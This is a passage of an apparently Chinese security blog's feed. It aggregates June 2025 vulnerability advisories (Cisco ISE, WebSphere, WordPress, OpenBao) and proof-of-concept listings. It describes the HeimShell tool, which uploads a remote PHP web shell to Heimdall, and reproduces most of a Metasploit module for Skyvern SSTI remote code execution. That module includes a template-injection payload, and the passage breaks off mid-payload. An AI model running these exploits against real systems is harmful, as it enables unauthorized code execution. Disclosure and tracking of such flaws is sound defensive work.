    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="目录穿越" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
    
  </entry>
  
  <entry>
    <title>LinuxServerio Heimdall 任意文件上传漏洞</title>
    <link href="http://example.com/2025/06/26/github_3105363199/"/>
    <id>http://example.com/2025/06/26/github_3105363199/</id>
    <published>2025-06-26T23:45:13.008Z</published>
    <updated>2025-06-26T23:45:13.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> LinuxServer.io Heimdall 任意文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-51803</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> LinuxServer.io Heimdall 2.5.7之前的版本存在任意文件上传漏洞，攻击者可以利用此漏洞上传包含非图像数据的图标文件，如包含’<?php ?>‘子字符串的文件，进而可能执行远程代码。</p><p><strong>产品厂商：</strong> LinuxServer.io</p><p><strong>产品名称：</strong> Heimdall</p><p><strong>影响版本：</strong> ≤ 2.5.6</p><p><strong>来源：</strong> <a href="https://github.com/superswan/HeimShell">https://github.com/superswan/HeimShell</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>heimShell.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="HeimShell-CVE-2023-51803"><a href="#HeimShell-CVE-2023-51803" class="headerlink" title="HeimShell (CVE-2023-51803)"></a>HeimShell (CVE-2023-51803)</h2><p><strong>HeimShell</strong> is an exploit for CVE-2023-51803, leveraging an arbitrary file-upload vulnerability in LinuxServer.io Heimdall (≤ 2.5.6). It will auto-detect the target version and either  warn of exploitability or remote fetch a php shell defined by <code>SHELL_URL</code> </p><ul><li><strong>≤ 2.2.2</strong>: Aribtrary file upload is possible but files are served statically and URLs are not remotely fetched</li><li><strong>≥ 2.2.3 &amp; ≤ 2.5.6</strong>: remote-fetch PHP shell via icon URL upload</li></ul><hr><ul><li><strong>Version Check:</strong> Retrieves <code>/settings</code> and parses the Version field to ensure arbitrary upload capability exists.</li><li><strong>CSRF Token Retrieval:</strong> Loads <code>/items/create</code> and scrapes the hidden <code>_token</code> input.</li><li><strong>Shell Deployment:</strong> For versions ≥ 2.2.3, it uses the icon parameter pointing to a remote PHP shell URL on a webserver</li><li><strong>Item Enumeration:</strong> Scrapes the item list (<code>/items</code>) to find the dashboard entry matching the random tag.</li><li><strong>Shell URL Extraction:</strong> Checks edit page (<code>/items/&lt;id&gt;/edit</code>), finds <code>icon</code> or <code>#appimage img</code> element, and prints shell URL.</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> heimShell.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;base_url&gt;</span><br>detected <span class="hljs-keyword">version</span>: <span class="hljs-number">2.4</span>.<span class="hljs-number">13</span><br>☠  <span class="hljs-keyword">shell</span> uploaded at: <span class="hljs-symbol">&lt;base_url&gt;</span>/storage/icons/abc123DEF456.php<br></code></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51803">https://nvd.nist.gov/vuln/detail/CVE-2023-51803</a></p><p><a href="https://rz.my/2024/06/cve-2023-51803-arbitrary-file-upload-in-linuxserverio-heimdall.html">https://rz.my/2024/06/cve-2023-51803-arbitrary-file-upload-in-linuxserverio-heimdall.html</a></p><h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>This tool is for authorized security testing only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; LinuxServer.io Heimdall 任意文件上传漏洞&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>A vulnerability in a specific API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated,</title>
    <link href="http://example.com/2025/06/26/github_3198141753/"/>
    <id>http://example.com/2025/06/26/github_3198141753/</id>
    <published>2025-06-26T22:00:07.189Z</published>
    <updated>2025-06-26T22:00:07.187Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-rc4f-42xm-hvjw">https://github.com/advisories/GHSA-rc4f-42xm-hvjw</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-20281">https://nvd.nist.gov/vuln/detail/CVE-2025-20281</a></p></li><li><p><a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6</a></p></li><li><p><a href="https://github.com/advisories/GHSA-rc4f-42xm-hvjw">https://github.com/advisories/GHSA-rc4f-42xm-hvjw</a></p></li></ul><p><strong>描述：</strong></p><p>A vulnerability in a specific API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated, remote attacker to execute arbitrary code on the underlying operating system as root. The attacker does not require any valid credentials to exploit this vulnerability.</p><p>This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by submitting a crafted API request. A successful exploit could allow the attacker to obtain root privileges on an affected device.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-rc4f-42xm-hvjw&quot;&gt;https://github.com/advisories/GHSA-rc4f-42xm-hvjw&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>A vulnerability in an internal API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated,</title>
    <link href="http://example.com/2025/06/26/github_2524818057/"/>
    <id>http://example.com/2025/06/26/github_2524818057/</id>
    <published>2025-06-26T22:00:06.833Z</published>
    <updated>2025-06-26T22:00:06.831Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-w8p2-wjjr-hr24">https://github.com/advisories/GHSA-w8p2-wjjr-hr24</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-20282">https://nvd.nist.gov/vuln/detail/CVE-2025-20282</a></p></li><li><p><a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6</a></p></li><li><p><a href="https://github.com/advisories/GHSA-w8p2-wjjr-hr24">https://github.com/advisories/GHSA-w8p2-wjjr-hr24</a></p></li></ul><p><strong>描述：</strong></p><p>A vulnerability in an internal API of Cisco ISE and Cisco ISE-PIC could allow an unauthenticated, remote attacker to upload arbitrary files to an affected device and then execute those files on the underlying operating system as root.</p><p>This vulnerability is due a lack of file validation checks that would prevent uploaded files from being placed in privileged directories on an affected system. An attacker could exploit this vulnerability by uploading a crafted file to the affected device. A successful exploit could allow the attacker to store malicious files on the affected system and then execute arbitrary code or obtain root privileges on the system.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-w8p2-wjjr-hr24&quot;&gt;https://github.com/advisories/GHSA-w8p2-wjjr-hr24&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>MICROSENS NMP Web+could allow an unauthenticated attacker to overwrite files and execute</title>
    <link href="http://example.com/2025/06/26/github_380367216/"/>
    <id>http://example.com/2025/06/26/github_380367216/</id>
    <published>2025-06-26T22:00:06.488Z</published>
    <updated>2025-06-26T22:00:06.487Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-j5hw-6f92-5gw9">https://github.com/advisories/GHSA-j5hw-6f92-5gw9</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49153">https://nvd.nist.gov/vuln/detail/CVE-2025-49153</a></p></li><li><p><a href="https://www.cisa.gov/news-events/ics-advisories/icsa-25-175-07">https://www.cisa.gov/news-events/ics-advisories/icsa-25-175-07</a></p></li><li><p><a href="https://www.microsens.com/support/downloads/nmp">https://www.microsens.com/support/downloads/nmp</a></p></li><li><p><a href="https://github.com/advisories/GHSA-j5hw-6f92-5gw9">https://github.com/advisories/GHSA-j5hw-6f92-5gw9</a></p></li></ul><p><strong>描述：</strong></p><p>MICROSENS NMP Web+</p><p>could allow an unauthenticated attacker to overwrite files and execute arbitrary code.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-j5hw-6f92-5gw9&quot;&gt;https://github.com/advisories/GHSA-j5hw-6f92-5gw9&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>IBM WebSphere Application Server 85 and 90 could allow a remote attacker to execute arbitrary</title>
    <link href="http://example.com/2025/06/26/github_2041971239/"/>
    <id>http://example.com/2025/06/26/github_2041971239/</id>
    <published>2025-06-26T22:00:06.174Z</published>
    <updated>2025-06-26T22:00:06.171Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-g9q6-26jf-g5cj">https://github.com/advisories/GHSA-g9q6-26jf-g5cj</a></p><p><strong>CVSS 评分：</strong> 9.1</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-36038">https://nvd.nist.gov/vuln/detail/CVE-2025-36038</a></p></li><li><p><a href="https://www.ibm.com/support/pages/node/7237967">https://www.ibm.com/support/pages/node/7237967</a></p></li><li><p><a href="https://github.com/advisories/GHSA-g9q6-26jf-g5cj">https://github.com/advisories/GHSA-g9q6-26jf-g5cj</a></p></li></ul><p><strong>描述：</strong></p><p>IBM WebSphere Application Server 8.5 and 9.0 could allow a remote attacker to execute arbitrary code on the system with a specially crafted sequence of serialized objects.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-g9q6-26jf-g5cj&quot;&gt;https://github.com/advisories/GHSA-g9q6-26jf-g5cj&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>The Simple User Registration plugin for WordPress is vulnerable to Privilege Escalation in all</title>
    <link href="http://example.com/2025/06/26/github_2980316439/"/>
    <id>http://example.com/2025/06/26/github_2980316439/</id>
    <published>2025-06-26T22:00:05.440Z</published>
    <updated>2025-06-26T22:00:05.439Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-6hwf-c64w-jxc6">https://github.com/advisories/GHSA-6hwf-c64w-jxc6</a></p><p><strong>CVSS 评分：</strong> 9.8</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4334">https://nvd.nist.gov/vuln/detail/CVE-2025-4334</a></p></li><li><p><a href="https://plugins.trac.wordpress.org/browser/wp-registration/trunk/inc/classes/class.register.php#L135">https://plugins.trac.wordpress.org/browser/wp-registration/trunk/inc/classes/class.register.php#L135</a></p></li><li><p><a href="https://www.wordfence.com/threat-intel/vulnerabilities/id/c211e0c0-3086-43d2-853c-489f9c42b0ab?source=cve">https://www.wordfence.com/threat-intel/vulnerabilities/id/c211e0c0-3086-43d2-853c-489f9c42b0ab?source=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-6hwf-c64w-jxc6">https://github.com/advisories/GHSA-6hwf-c64w-jxc6</a></p></li></ul><p><strong>描述：</strong></p><p>The Simple User Registration plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 6.3. This is due to insufficient restrictions on user meta values that can be supplied during registration. This makes it possible for unauthenticated attackers to register as an administrator.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-6hwf-c64w-jxc6&quot;&gt;https://github.com/advisories/GHSA-6hwf-c64w-jxc6&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>OpenBao allows cancellation of root rekey and recovery rekey operations without authentication</title>
    <link href="http://example.com/2025/06/26/github_517646360/"/>
    <id>http://example.com/2025/06/26/github_517646360/</id>
    <published>2025-06-26T21:30:04.822Z</published>
    <updated>2025-06-26T21:30:04.819Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-prpj-rchp-9j5h">https://github.com/advisories/GHSA-prpj-rchp-9j5h</a></p><p><strong>仓库 Star：</strong> 3998</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h">https://github.com/openbao/openbao/security/advisories/GHSA-prpj-rchp-9j5h</a></p></li><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52894">https://nvd.nist.gov/vuln/detail/CVE-2025-52894</a></p></li><li><p><a href="https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b">https://github.com/openbao/openbao/commit/fe75468822a22a88318c6079425357a02ae5b77b</a></p></li><li><p><a href="https://github.com/openbao/openbao/releases/tag/v2.3.1">https://github.com/openbao/openbao/releases/tag/v2.3.1</a></p></li><li><p><a href="https://github.com/advisories/GHSA-prpj-rchp-9j5h">https://github.com/advisories/GHSA-prpj-rchp-9j5h</a></p></li></ul><p><strong>描述：</strong></p><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><p>OpenBao and HashiCorp Vault allowed an attacker to perform unauthenticated, unaudited cancellation of root rekey and recovery rekey operations, effecting a denial of service.</p><h3 id="Patches"><a href="#Patches" class="headerlink" title="Patches"></a>Patches</h3><p>In OpenBao v2.2.2 and later, manually setting the configuration option <code>disable_unauthed_rekey_endpoints=true</code> allows an operator to deny these rarely-used endpoints on global listeners.</p><p>In a future OpenBao release <a href="https://openbao.org/docs/deprecation/">communicated on our website</a>, we will set this to <code>true</code> for all users and provide an authenticated alternative.</p><p>This vulnerability has been disclosed to HashiCorp; see their website for more information. </p><h3 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h3><p>If an active proxy or load balancer sits in front of OpenBao, an operator can deny requests to these endpoints from unauthorized IP ranges.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>See the <a href="https://openbao.org/docs/deprecation/unauthed-rekey/">deprecation notice</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-prpj-rchp-9j5h&quot;&gt;https://github.com/advisories/GHSA-prpj-rchp-9j5h&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2025-49144-Test</title>
    <link href="http://example.com/2025/06/26/github_1961244886/"/>
    <id>http://example.com/2025/06/26/github_1961244886/</id>
    <published>2025-06-26T21:15:20.960Z</published>
    <updated>2025-06-26T21:15:20.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-49144-Test</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> CVE-2025-49144的测试攻击</p><p><strong>来源：</strong> <a href="https://github.com/tristanvandermeer/CVE-2025-49144-Test">https://github.com/tristanvandermeer/CVE-2025-49144-Test</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-49144-Test"><a href="#CVE-2025-49144-Test" class="headerlink" title="CVE-2025-49144-Test"></a>CVE-2025-49144-Test</h2><p>A test attack for CVE-2025-49144</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-49144-Test&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Skyvern SSTI Remote Code Execution</title>
    <link href="http://example.com/2025/06/26/github_897149530/"/>
    <id>http://example.com/2025/06/26/github_897149530/</id>
    <published>2025-06-26T21:15:13.385Z</published>
    <updated>2025-06-26T21:15:13.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Skyvern SSTI Remote Code Execution</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> 2025-49619</li></ul><p><strong>漏洞类型：</strong> 服务端模板注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 该模块利用了Skyvern&lt;&#x3D;0.1.84版本中的服务端模板注入(SSTI)漏洞，允许远程代码执行。攻击者需要API密钥来发送请求并上传恶意工作流。</p><p><strong>产品厂商：</strong> Skyvern</p><p><strong>产品名称：</strong> Skyvern</p><p><strong>影响版本：</strong> &lt;&#x3D;0.1.84</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/7b845fa3df4d938b5d1674ae981291779194317f/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb">https://github.com/rapid7/metasploit-framework/blob/7b845fa3df4d938b5d1674ae981291779194317f/modules%2Fexploits%2Flinux%2Fhttp%2Fskyvern_ssti_cve_2025_49619.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Skyvern SSTI Remote Code Execution&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          This module exploits SSTI vulnerability in Skyvern&lt;=0.1.84. The module requires API key to deliver requests and upload malicious workflow.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Cristian Branet&#x27;</span>, <span class="hljs-comment"># researcher</span><br>          <span class="hljs-string">&#x27;msutovsky-r7&#x27;</span> <span class="hljs-comment"># module dev</span><br>        ],<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [ <span class="hljs-string">&#x27;EDB&#x27;</span>, <span class="hljs-string">&#x27;52335&#x27;</span> ],<br>          [ <span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://cristibtz.blog/posts/CVE-2025-49619/&#x27;</span>],<br>          [ <span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-49619&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux Target&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">%w[linux]</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_CMD</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-07&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>]<br>        &#125;<br>      )<br>    )<br>    register_options([<br>      <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;API_KEY&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;API key for Skyvern&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>])<br>    ])<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_workflow_json</span><br>    &#123;<br>      <span class="hljs-symbol">title:</span> <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>),<br>      <span class="hljs-symbol">description:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">proxy_location:</span> <span class="hljs-string">&#x27;RESIDENTIAL&#x27;</span>,<br>      <span class="hljs-symbol">webhook_callback_url:</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-symbol">persist_browser_session:</span> <span class="hljs-literal">false</span>,<br>      <span class="hljs-symbol">model:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">totp_verification_url:</span> <span class="hljs-literal">nil</span>,<br>      <span class="hljs-symbol">workflow_definition:</span> &#123;<br>        <span class="hljs-symbol">parameters:</span> [],<br>        <span class="hljs-symbol">blocks:</span> [<br>          &#123;<br>            <span class="hljs-symbol">label:</span> <span class="hljs-string">&#x27;block_1&#x27;</span>,<br>            <span class="hljs-symbol">continue_on_failure:</span> <span class="hljs-literal">false</span>,<br>            <span class="hljs-symbol">block_type:</span> <span class="hljs-string">&#x27;task_v2&#x27;</span>,<br>            <span class="hljs-symbol">prompt:</span> <span class="hljs-string">%&lt;&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;\n  &#123;% if &#x27;warning&#x27; in x.__name__ %&#125;\n    &#123;&#123; 